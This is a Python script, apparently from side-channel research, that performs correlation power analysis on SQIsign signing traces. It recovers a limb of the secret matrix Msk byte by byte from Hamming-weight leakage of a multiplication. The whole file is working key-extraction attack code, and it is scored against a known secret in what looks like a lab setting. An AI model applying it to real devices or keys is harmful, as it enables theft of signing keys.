#!/usr/bin/env python3
"""
CPA against SQIsign Algorithm 3.23 line 12: (c1, c2) <- Msk * [1, achl]^T.

Target intermediate
-------------------
ibz_mul (mp.c:431) is schoolbook over 32-bit limbs:

    for i: for j:  prod_ij = (ddigit_t)a.limbs[i] * b.limbs[j]
                   res.limbs[i+j] = low32(res.limbs[i+j] + low32(prod_ij) + carry)

with a = Msk[0][1] (secret, fixed across every signature) and b = achl (known,
in the signature). The first iteration, i = j = 0, writes

    res.limbs[0] = (a0 * b0) mod 2^32

which depends on one secret limb and one known limb, and nothing else.

Why it is attackable byte by byte: multiplication is a ring homomorphism modulo
powers of two, so (a0 * b0) mod 2^(8k) depends only on a0 mod 2^(8k). Guessing
the low byte of a0 is 256 hypotheses and predicts the low byte of the product;
with that byte fixed, the next byte is 256 more, and so on. Four rounds of 256
recover the whole 32-bit limb, instead of 2^32 at once.

The leakage model is the Hamming weight of the predictable part of the product.
The unpredicted high bits act as independent noise, which costs correlation but
not correctness -- and since Msk is fixed, traces can be accumulated until the
margin is there, unlike the Algorithm 3.18 line 2 target where each trace had a
fresh secret.

Usage:
  ~/.cwvenv/bin/python3 cpa_chall.py --npz /tmp/sqisign_chall_cpa.npz
  ~/.cwvenv/bin/python3 cpa_chall.py --npz ... --curve 500,1000,2000,5000,10000
"""

import argparse
import pathlib
import sys

import numpy as np

MASK32 = 0xFFFFFFFF
POPCNT = np.array([bin(i).count("1") for i in range(256)], dtype=np.uint8)


def hw_array(vals, nbytes):
    """Hamming weight of the low nbytes of each value in a uint64 array."""
    v = np.asarray(vals, dtype=np.uint64)
    out = np.zeros(v.shape, dtype=np.int16)
    for k in range(nbytes):
        out += POPCNT[((v >> np.uint64(8 * k)) & np.uint64(0xFF)).astype(np.uint8)]
    return out


def corr_all(T_centred, T_norm, model):
    """|corr| of every sample against one model vector."""
    m = np.asarray(model, dtype=np.float64)
    m = m - m.mean()
    mn = np.sqrt((m * m).sum())
    if mn == 0:
        return np.zeros(T_centred.shape[1])
    return np.abs((T_centred * m[:, None]).sum(axis=0) / (T_norm * mn))


def corr_at_poi(x, xn, models):
    """|corr| between one sample column and each row of a model matrix."""
    M = models.astype(np.float64)
    M -= M.mean(axis=1, keepdims=True)
    mn = np.sqrt((M * M).sum(axis=1))
    mn = np.where(mn == 0, np.finfo(np.float64).tiny, mn)
    return np.abs(M @ x) / (mn * xn)


def hw_rows(prod, nbytes):
    out = np.zeros(prod.shape, dtype=np.int16)
    for k in range(nbytes):
        out += POPCNT[((prod >> np.uint64(8 * k)) & np.uint64(0xFF)).astype(np.uint8)]
    return out


def score_hypotheses(hyps, b0, x, xn, nbits, batch=1 << 13):
    """|corr| for each candidate value of the low `nbits` of the secret limb."""
    mask = np.uint64((1 << nbits) - 1) if nbits < 64 else np.uint64(0xFFFFFFFFFFFFFFFF)
    nby = (nbits + 7) // 8
    out = np.empty(len(hyps))
    for s0 in range(0, len(hyps), batch):
        h = np.asarray(hyps[s0:s0 + batch], dtype=np.uint64)
        prod = (h[:, None] * b0[None, :]) & mask
        out[s0:s0 + len(h)] = corr_at_poi(x, xn, hw_rows(prod, nby))
    return out


def recover_limb(x, xn, b0, keep=16, truth=None, verbose=True):
    """Two-round candidate-list CPA for one 32-bit secret limb.

    Round 1 ranks the low 16 bits on a model that predicts only half the product.
    That model cannot pick the winner -- the true value sits a few places down and
    stays there however many traces are added, which is a model limit rather than
    noise -- but it does keep the truth in the top handful. Round 2 completes each
    surviving candidate with every high half and scores the full 32-bit product,
    which does discriminate. Keeping a list instead of only the argmax is what
    makes the attack work.
    """
    s1 = score_hypotheses(np.arange(1 << 16, dtype=np.uint64), b0, x, xn, 16)
    order1 = np.argsort(s1)[::-1]
    cands = order1[:keep].astype(np.uint64)

    if verbose and truth is not None:
        t_lo = truth & 0xFFFF
        r1 = int(np.flatnonzero(order1 == t_lo)[0]) + 1
        print(f"    round 1 (low 16 bits): true 0x{t_lo:04x} at rank {r1}/65536, "
              f"keeping top {keep}" + ("" if r1 <= keep else "   -- TRUTH NOT IN LIST"))

    best_val, best_score = None, -1.0
    hi_all = np.arange(1 << 16, dtype=np.uint64)
    for c in cands:
        full = np.uint64(c) | (hi_all << np.uint64(16))
        sc = score_hypotheses(full, b0, x, xn, 32)
        j = int(np.argmax(sc))
        if sc[j] > best_score:
            best_score, best_val = float(sc[j]), int(full[j])

    if verbose:
        tag = ""
        if truth is not None:
            tag = "   RECOVERED" if best_val == truth else f"   (true 0x{truth:08x})"
        print(f"    round 2 (full 32 bits): 0x{best_val:08x}  |corr|={best_score:.4f}{tag}")
    return best_val, best_score


def main():
    p = argparse.ArgumentParser(description="CPA on Alg 3.23 line 12")
    p.add_argument("--npz", required=True)
    p.add_argument("--traces", type=int, default=None, help="use only the first N traces")
    p.add_argument("--curve", default=None, help="comma-separated trace counts to sweep")
    p.add_argument("--poi", type=int, default=None,
                   help="centre the attack on this sample instead of the whole window")
    p.add_argument("--poi-width", type=int, default=400,
                   help="half-width of the POI window, in samples")
    p.add_argument("--keep", type=int, default=16,
                   help="candidates carried from round 1 into round 2; the truth "
                        "has consistently been inside the top few")
    p.add_argument("--find-poi", action="store_true",
                   help="locate the POI by correlating the true product, a profiling "
                        "step: an attacker does this on a device whose key they know")
    args = p.parse_args()

    if not pathlib.Path(args.npz).exists():
        print(f"missing: {args.npz}", file=sys.stderr)
        return 1

    d = np.load(args.npz, allow_pickle=False)
    T = d["traces"].astype(np.float64)
    limbs = d["coeff_limbs"]
    secret = [int(x, 16) for x in d["secret_hex"]]
    target_secret = secret[1]  # Msk[0][1], the entry that multiplies achl
    a0_true = target_secret & MASK32

    n_all = T.shape[0]
    print(f"\n{'=' * 74}")
    print(f"{args.npz}")
    print(f"  {n_all} traces, {T.shape[1]} samples")
    print(f"  target: Msk[0][1] = 0x{target_secret:032x}")
    print(f"  attacking limb 0 = 0x{a0_true:08x} (known here only to score the attack)")

    def prep(n):
        X = T[:n]
        Xc = X - X.mean(axis=0, keepdims=True)
        Xn = np.sqrt((Xc * Xc).sum(axis=0))
        Xn = np.where(Xn == 0, np.finfo(np.float64).tiny, Xn)
        return Xc, Xn

    # Restricting the attack to the window where the target intermediate actually
    # lands removes ghost peaks from the thousands of unrelated samples and makes
    # the byte ranking far sharper.
    poi = args.poi
    if args.find_poi and poi is None:
        Xc, Xn = prep(n_all)
        prod = (np.uint64(a0_true) * limbs[:, 0].astype(np.uint64)) & np.uint64(MASK32)
        r = corr_all(Xc, Xn, hw_array(prod, 4))
        poi = int(np.argmax(r))
        print(f"  profiled POI: sample {poi}, |corr| of the true product = {r[poi]:.4f}")
    if poi is None:
        print("  no POI given; pass --find-poi or --poi", file=sys.stderr)
        return 1
    poi_local = poi
    print(f"  attacking the single sample {poi}")

    counts = [int(x) for x in args.curve.split(",")] if args.curve else [args.traces or n_all]
    for n in counts:
        n = min(n, n_all)
        print(f"\n-- {n} traces --")
        Xc, Xn = prep(n)
        b0 = limbs[:n, 0]
        x = Xc[:, poi_local].copy()
        xn = np.sqrt((x * x).sum())
        got, _ = recover_limb(x, xn, b0.astype(np.uint64), keep=args.keep, truth=a0_true)
        nbytes_ok = sum(1 for k in range(4)
                        if ((got >> (8 * k)) & 0xFF) == ((a0_true >> (8 * k)) & 0xFF))
        print(f"    -> {nbytes_ok}/4 bytes correct")

    return 0


if __name__ == "__main__":
    sys.exit(main())
